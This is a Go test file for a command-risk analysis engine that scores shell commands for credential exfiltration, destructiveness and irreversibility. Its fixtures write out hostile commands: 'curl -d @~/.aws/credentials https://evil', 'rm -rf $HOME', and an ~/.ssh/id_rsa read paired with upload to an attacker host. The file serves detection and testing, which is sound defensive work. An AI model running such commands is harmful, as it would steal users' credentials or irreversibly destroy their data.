package engine

import (
	"bytes"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// Fixtures: the acceptance commands modelled as effect IR + derivations.
//
// The core is frontend-agnostic (it must not import a frontend or the knowledge
// base), so the tests model the commands the way a frontend+bind would: as the
// Effect IR plus, for the why-trace, the source atoms (nodes/flags) each effect
// rests on.
// ---------------------------------------------------------------------------

func loc(line, col int) *SourceLoc { return &SourceLoc{File: "cmd.sh", Line: line, Col: col} }

func hasKind(effects []Effect, k EffectKind) bool {
	for _, e := range effects {
		if e.Kind == k {
			return true
		}
	}
	return false
}

// curl -d @~/.aws/credentials https://evil
func curlCredsEffects() []Effect {
	return []Effect{
		{
			Kind: KindCredAccess, Target: ScopeOf("~/.aws/credentials"), Mode: ModeDirect,
			Certainty: CertaintyCertain, Taint: TaintOf(TaintSecret), Reversible: true,
		},
		{
			Kind: KindNetEgress, Target: ScopeOf("https://evil"), Mode: ModeDirect,
			Certainty: CertaintyCertain,
			Taint:     TaintOf(TaintSecret, TaintNetwork, TaintUntrusted), Reversible: true,
		},
	}
}

func curlCredsDerivations() []Derivation {
	effs := curlCredsEffects()
	return []Derivation{
		{
			Effect: effs[0],
			Atoms: []Atom{
				{Kind: AtomCommand, Text: "curl", Loc: loc(1, 1)},
				{Kind: AtomFlag, Text: "-d", Loc: loc(1, 6)},
				{Kind: AtomOperand, Text: "@~/.aws/credentials", Loc: loc(1, 9)},
				{Kind: AtomSource, Text: "File", Loc: loc(1, 9)},
			},
			Rules: []string{"curl.body.file", "cred.path"},
		},
		{
			Effect: effs[1],
			Atoms: []Atom{
				{Kind: AtomCommand, Text: "curl", Loc: loc(1, 1)},
				{Kind: AtomOperand, Text: "https://evil", Loc: loc(1, 28)},
				{Kind: AtomSink, Text: "NetEgress", Loc: loc(1, 28)},
			},
			Rules: []string{"net.egress"},
		},
	}
}

// cat file
func catEffects() []Effect {
	return []Effect{{
		Kind: KindFSRead, Target: ScopeOf("file"), Mode: ModeDirect,
		Certainty: CertaintyCertain, Taint: TaintBottom(), Reversible: true,
	}}
}

func catDerivations() []Derivation {
	e := catEffects()[0]
	return []Derivation{{
		Effect: e,
		Atoms: []Atom{
			{Kind: AtomCommand, Text: "cat", Loc: loc(1, 1)},
			{Kind: AtomOperand, Text: "file", Loc: loc(1, 5)},
		},
		Rules: []string{"fs.read"},
	}}
}

// rm -rf $HOME
func rmHomeEffects() []Effect {
	return []Effect{{
		Kind: KindFSWrite, Target: ScopeOf("$HOME"), Mode: ModeDirect,
		Certainty: CertaintyCertain, Taint: TaintBottom(), Reversible: false,
	}}
}

func rmHomeDerivations() []Derivation {
	e := rmHomeEffects()[0]
	return []Derivation{{
		Effect: e,
		Atoms: []Atom{
			{Kind: AtomCommand, Text: "rm", Loc: loc(1, 1)},
			{Kind: AtomFlag, Text: "-rf", Loc: loc(1, 4)},
			{Kind: AtomOperand, Text: "$HOME", Loc: loc(1, 8)},
		},
		Rules: []string{"fs.delete"},
	}}
}

// ---------------------------------------------------------------------------
// Acceptance criterion 1
//
//   curl -d @~/.aws/credentials https://evil
//     → CredAccess + NetEgress + a high exfiltration score.
// ---------------------------------------------------------------------------

func TestCurlCredentialsExfiltration(t *testing.T) {
	effects := curlCredsEffects()

	if !hasKind(effects, KindCredAccess) || !hasKind(effects, KindNetEgress) {
		t.Fatalf("model must contain both CredAccess and NetEgress: %+v", effects)
	}

	pairs := DetectExfil(effects)
	if len(pairs) == 0 {
		t.Fatalf("expected a CredAccess x NetEgress exfil pairing")
	}
	if IsSecretRead(pairs[0].Source) == false {
		t.Errorf("exfil source must be a secret read: %+v", pairs[0].Source)
	}
	if IsEgressSink(pairs[0].Sink) == false {
		t.Errorf("exfil sink must be a tainted egress: %+v", pairs[0].Sink)
	}

	sc := ScoreEffects(effects, "curl")
	if sc.Exfil < DestructHigh {
		t.Errorf("exfil score: got %v, want >= High", sc.Exfil)
	}
	if sc.Exfil != DestructCritical {
		t.Errorf("exfil score: got %v, want Critical (credential exfiltration)", sc.Exfil)
	}
	if sc.Grade != DestructCritical {
		t.Errorf("grade: got %v, want Critical", sc.Grade)
	}
	if len(sc.ExfilPairs) != len(pairs) {
		t.Errorf("ExfilPairs: got %d, want %d", len(sc.ExfilPairs), len(pairs))
	}
}

// An FSRead of a secret path is also a secret source (CredAccess/FSRead(secret)).
func TestFSReadSecretPathIsExfilSource(t *testing.T) {
	read := Effect{
		Kind: KindFSRead, Target: ScopeOf("/home/u/.ssh/id_rsa"), Mode: ModeDirect,
		Certainty: CertaintyCertain, Taint: TaintBottom(), Reversible: true,
	}
	if !IsSecretRead(read) {
		t.Fatalf("FSRead of ~/.ssh/id_rsa must count as a secret read")
	}
	egress := Effect{
		Kind: KindNetEgress, Target: ScopeOf("https://evil/upload"), Mode: ModeDirect,
		Certainty: CertaintyCertain, Taint: TaintOf(TaintSecret), Reversible: true,
	}
	if got := len(DetectExfil([]Effect{read, egress})); got != 1 {
		t.Errorf("DetectExfil: got %d pairings, want 1", got)
	}
}

// ---------------------------------------------------------------------------
// Acceptance criterion 2
//
//   cat file       → low destructiveness.
//   rm -rf $HOME   → maximal, Reversible = false.
// ---------------------------------------------------------------------------

func TestCatIsLowDestructiveness(t *testing.T) {
	sc := ScoreEffects(catEffects(), "cat")
	if sc.Destructiveness != DestructLow {
		t.Errorf("destructiveness: got %v, want Low", sc.Destructiveness)
	}
	if sc.Grade != DestructLow {
		t.Errorf("grade: got %v, want Low", sc.Grade)
	}
	if !sc.Reversible {
		t.Errorf("cat must be reversible")
	}
	if sc.Irreversibility != DestructNone {
		t.Errorf("irreversibility: got %v, want None", sc.Irreversibility)
	}
	if sc.Exfil != DestructNone {
		t.Errorf("exfil: got %v, want None", sc.Exfil)
	}
}

func TestRmRfHomeIsMaximalAndIrreversible(t *testing.T) {
	effects := rmHomeEffects()
	if effects[0].Reversible {
		t.Fatalf("fixture must model an irreversible write")
	}

	sc := ScoreEffects(effects, "rm")
	if sc.Grade != DestructCritical {
		t.Errorf("grade: got %v, want Critical (maximal)", sc.Grade)
	}
	if sc.Reversible {
		t.Errorf("reversible: got true, want false")
	}
	if sc.Irreversibility != DestructCritical {
		t.Errorf("irreversibility: got %v, want Critical", sc.Irreversibility)
	}
	if sc.Breadth < DestructHigh {
		t.Errorf("breadth: got %v, want >= High (covers $HOME)", sc.Breadth)
	}

	// The escalation must not depend on the command token being supplied: a
	// non-reversible write of a whole home subtree is already maximal.
	scNoToken := ScoreEffects(effects)
	if scNoToken.Grade != DestructCritical {
		t.Errorf("grade without token: got %v, want Critical", scNoToken.Grade)
	}
}

// The same destructive command aimed at a single file is High, not maximal: the
// breadth dimension is what separates `rm -rf $HOME` from `rm file`.
func TestRmSingleFileIsHighNotMaximal(t *testing.T) {
	eff := Effect{
		Kind: KindFSWrite, Target: ScopeOf("/tmp/one-file"), Mode: ModeDirect,
		Certainty: CertaintyCertain, Taint: TaintBottom(), Reversible: false,
	}
	sc := ScoreEffects([]Effect{eff}, "rm")
	if sc.Grade != DestructHigh {
		t.Errorf("grade: got %v, want High", sc.Grade)
	}
	if sc.Grade >= DestructCritical {
		t.Errorf("a single-file rm must not be Critical: got %v", sc.Grade)
	}
}

// ---------------------------------------------------------------------------
// Acceptance criterion 3
//
//   The why-trace points at a concrete node/flag for every non-empty effect.
// ---------------------------------------------------------------------------

func TestWhyTraceCitesConcreteNodeOrFlag(t *testing.T) {
	cases := []struct {
		name    string
		effects []Effect
		ders    []Derivation
	}{
		{"curl", curlCredsEffects(), curlCredsDerivations()},
		{"cat", catEffects(), catDerivations()},
		{"rm", rmHomeEffects(), rmHomeDerivations()},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			why := BuildWhy(tc.ders)
			if gaps := WhyGaps(tc.effects, why); len(gaps) != 0 {
				t.Fatalf("effects lacking a concrete why-trace: %v", gaps)
			}
			for _, e := range tc.effects {
				steps := WhyStepsFor(why, e.Key())
				if len(steps) == 0 {
					t.Errorf("%s: no why-trace", e.Key())
					continue
				}
				concrete := false
				for _, s := range steps {
					if len(s.Premises) == 0 {
						t.Errorf("%s: step %q has no premise", e.Key(), s.Rule)
					}
					for _, p := range s.Premises {
						if isConcretePremise(p) {
							concrete = true
						}
					}
				}
				if !concrete {
					t.Errorf("%s: why-trace cites no concrete node/flag", e.Key())
				}
			}

			// The traces must keep the report valid after normalisation.
			rep := &Report{SchemaVersion: SchemaVersion, Effects: tc.effects, Why: why}
			rep.Normalize()
			if err := rep.Validate(); err != nil {
				t.Fatalf("report invalid: %v", err)
			}
			if gaps := WhyGaps(rep.Effects, rep.Why); len(gaps) != 0 {
				t.Errorf("after normalize, unexplained effects: %v", gaps)
			}
		})
	}
}

// The curl why-trace must name the concrete flag and operand node, each with a
// source location.
func TestWhyTracePointsAtSpecificFlagAndNode(t *testing.T) {
	effects := curlCredsEffects()
	why := BuildWhy(curlCredsDerivations())
	steps := WhyStepsFor(why, effects[0].Key())
	if len(steps) == 0 {
		t.Fatalf("no why-trace for CredAccess")
	}
	premises := make(map[string]bool)
	for _, s := range steps {
		if s.Loc == nil {
			t.Errorf("step %q has no source location", s.Rule)
		}
		for _, p := range s.Premises {
			premises[p] = true
		}
	}
	for _, want := range []string{"command:curl", "flag:-d", "operand:@~/.aws/credentials"} {
		if !premises[want] {
			t.Errorf("why-trace missing concrete premise %q (have %v)", want, premises)
		}
	}
}

func TestWhyGapsReportsUnexplainedEffect(t *testing.T) {
	e := catEffects()[0]
	why := BuildWhy([]Derivation{{Effect: e}}) // no atoms
	if gaps := WhyGaps([]Effect{e}, why); len(gaps) != 1 {
		t.Fatalf("expected the atom-less effect to be reported: %v", gaps)
	}
	// The trace still exists (so Report.Validate passes), it is just not concrete.
	if steps := WhyStepsFor(why, e.Key()); len(steps) == 0 {
		t.Errorf("BuildWhy must still emit a trace")
	}
	rep := &Report{SchemaVersion: SchemaVersion, Effects: []Effect{e}, Why: why}
	if err := rep.Validate(); err != nil {
		t.Errorf("report with synthetic trace must validate: %v", err)
	}
}

// ---------------------------------------------------------------------------
// Supporting unit tests: the individual dimensions.
// ---------------------------------------------------------------------------

func TestSourceClassMapping(t *testing.T) {
	cases := []struct {
		c      SourceClass
		inf    Influence
		labels []string
	}{
		{SourceUntrustedContent, InfluenceDirect, []string{TaintUntrusted}},
		{SourceEnv, InfluenceIndirect, []string{TaintEnv}},
		{SourceFile, InfluenceIndirect, []string{TaintFileSystem}},
		{SourceLiteral, InfluenceNone, nil},
	}
	for _, tc := range cases {
		if !tc.c.Valid() {
			t.Errorf("%q not valid", tc.c)
		}
		if got := tc.c.Influence(); got != tc.inf {
			t.Errorf("%s influence: got %v, want %v", tc.c, got, tc.inf)
		}
		if got := tc.c.Labels(); !got.Equal(TaintOf(tc.labels...)) {
			t.Errorf("%s labels: got %v, want %v", tc.c, got, TaintOf(tc.labels...))
		}
	}
}

func TestProvenanceFoldsSources(t *testing.T) {
	p := NewProvenance(SourceLiteral, SourceUntrustedContent, SourceUntrustedContent)
	if got := p.Taint(); !got.Equal(TaintOf(TaintUntrusted)) {
		t.Errorf("taint: got %v, want {untrusted}", got)
	}
	if got := p.Influence(); got != InfluenceDirect {
		t.Errorf("influence: got %v, want Direct", got)
	}
	if p.Trusted() {
		t.Errorf("provenance with untrusted content must not be trusted")
	}

	lit := NewProvenance(SourceLiteral)
	if !lit.Taint().IsBottom() {
		t.Errorf("literal taint: got %v, want ⊥", lit.Taint())
	}
	if !lit.Trusted() {
		t.Errorf("literal provenance must be trusted")
	}
}

func TestBreadthOrderingAndSecretEscalation(t *testing.T) {
	if BreadthExact.Severity() >= BreadthGlob.Severity() ||
		BreadthGlob.Severity() >= BreadthHome.Severity() ||
		BreadthHome.Severity() >= BreadthRoot.Severity() {
		t.Fatalf("breadth severities must strictly increase exact<glob<home<root")
	}

	cases := []struct {
		target string
		want   Breadth
	}{
		{"file.txt", BreadthExact},
		{"~/.config/app", BreadthExact},
		{"/var/log/*.log", BreadthGlob},
		{"$HOME", BreadthHome},
		{"$HOME/*", BreadthHome},
		{"/", BreadthRoot},
	}
	for _, tc := range cases {
		if got := BreadthOf(ScopeOf(tc.target)); got != tc.want {
			t.Errorf("BreadthOf(%q): got %v, want %v", tc.target, got, tc.want)
		}
	}
	if got := BreadthOf(ScopeTop()); got != BreadthRoot {
		t.Errorf("BreadthOf(⊤): got %v, want Root", got)
	}
	if got := BreadthOf(ScopeBottom()); got != BreadthNone {
		t.Errorf("BreadthOf(⊥): got %v, want None", got)
	}

	// Secret paths raise the severity one step.
	if got := BreadthSeverity(ScopeOf("~/.aws/credentials")); got != DestructMedium {
		t.Errorf("secret breadth: got %v, want Medium (Low escalated)", got)
	}
	if got := BreadthSeverity(ScopeOf("file.txt")); got != DestructLow {
		t.Errorf("plain breadth: got %v, want Low", got)
	}
}

func TestIrreversibilityCommandTable(t *testing.T) {
	cases := []struct {
		token string
		want  Irreversibility
	}{
		{"rm", IrrevPermanent},
		{"/bin/rm", IrrevPermanent},
		{"truncate", IrrevPermanent},
		{"dd", IrrevDestructive},
		{"mkfs", IrrevDestructive},
		{"mkfs.ext4", IrrevDestructive},
		{"shred", IrrevDestructive},
		{"cat", IrrevReversible},
		{"", IrrevReversible},
	}
	for _, tc := range cases {
		if got := IrreversibilityOfCommand(tc.token); got != tc.want {
			t.Errorf("IrreversibilityOfCommand(%q): got %v, want %v", tc.token, got, tc.want)
		}
	}
	if IrrevPermanent.Severity() >= IrrevDestructive.Severity() {
		t.Errorf("Permanent must be less severe than Destructive")
	}
}

func TestIrreversibilityOfEffect(t *testing.T) {
	riv := Effect{Kind: KindFSRead, Mode: ModeDirect, Certainty: CertaintyCertain, Reversible: true}
	if got := IrreversibilityOf(riv, "cat"); got != IrrevReversible {
		t.Errorf("reversible read: got %v, want Reversible", got)
	}
	rm := Effect{Kind: KindFSWrite, Mode: ModeDirect, Certainty: CertaintyCertain, Reversible: false}
	if got := IrreversibilityOf(rm, "rm"); got != IrrevPermanent {
		t.Errorf("rm write: got %v, want Permanent", got)
	}
	// The effect's own irreversibility is seen even without the token.
	if got := IrreversibilityOf(rm); got != IrrevPermanent {
		t.Errorf("rm write without token: got %v, want Permanent", got)
	}
}

func TestInfluenceOfEffect(t *testing.T) {
	cases := []struct {
		taint Taint
		want  Influence
	}{
		{TaintBottom(), InfluenceNone},
		{TaintOf(TaintUntrusted), InfluenceDirect},
		{TaintOf(TaintUserInput), InfluenceDirect},
		{TaintOf(TaintEnv), InfluenceIndirect},
		{TaintOf(TaintNetwork), InfluenceIndirect},
		{TaintOf(TaintFileSystem), InfluenceIndirect},
		{TaintOf(TaintSecret), InfluenceNone},
		{TaintTop(), InfluenceDirect},
	}
	for _, tc := range cases {
		e := Effect{Kind: KindNetEgress, Mode: ModeDirect, Certainty: CertaintyCertain, Taint: tc.taint}
		if got := InfluenceOf(e); got != tc.want {
			t.Errorf("InfluenceOf(taint=%v): got %v, want %v", tc.taint, got, tc.want)
		}
	}
}

func TestConfidenceOfEffect(t *testing.T) {
	certainExact := Effect{Kind: KindFSRead, Target: ScopeOf("file"), Mode: ModeDirect, Certainty: CertaintyCertain}
	if got := ConfidenceOf(certainExact); got != 100 {
		t.Errorf("certain exact: got %d, want 100", got)
	}
	certainTop := Effect{Kind: KindCodeExec, Target: ScopeTop(), Mode: ModeDirect, Certainty: CertaintyCertain}
	if got := ConfidenceOf(certainTop); got != 60 {
		t.Errorf("certain ⊤: got %d, want 60", got)
	}
	unknown := Effect{Kind: KindFSRead, Target: ScopeOf("file"), Mode: ModeDirect, Certainty: CertaintyUnknown}
	if got := ConfidenceOf(unknown); got != 0 {
		t.Errorf("unknown: got %d, want 0", got)
	}
}

func TestExfilRequiresSecretSource(t *testing.T) {
	// A tainted egress alone is not exfiltration: nothing secret was read.
	egressOnly := []Effect{{
		Kind: KindNetEgress, Target: ScopeOf("https://evil"), Mode: ModeDirect,
		Certainty: CertaintyCertain, Taint: TaintOf(TaintUntrusted), Reversible: true,
	}}
	if pairs := DetectExfil(egressOnly); len(pairs) != 0 {
		t.Errorf("egress without a secret source must not pair: %v", pairs)
	}
	if sc := ScoreEffects(egressOnly, "curl"); sc.Exfil != DestructNone {
		t.Errorf("exfil: got %v, want None", sc.Exfil)
	}
}

func TestScoreEmptyAndDeterministic(t *testing.T) {
	empty := ScoreEffects(nil)
	if empty.Grade != DestructNone || !empty.Reversible || empty.Confidence != 0 {
		t.Errorf("empty score: %+v", empty)
	}

	a, err := ScoreEffects(curlCredsEffects(), "curl").Encode()
	if err != nil {
		t.Fatalf("encode: %v", err)
	}
	b, err := ScoreEffects(curlCredsEffects(), "curl").Encode()
	if err != nil {
		t.Fatalf("encode: %v", err)
	}
	if !bytes.Equal(a, b) {
		t.Errorf("score encoding is not deterministic")
	}
	if !strings.Contains(string(a), `"exfil": "Critical"`) {
		t.Errorf("score JSON must expose the exfil grade, got:\n%s", a)
	}
}
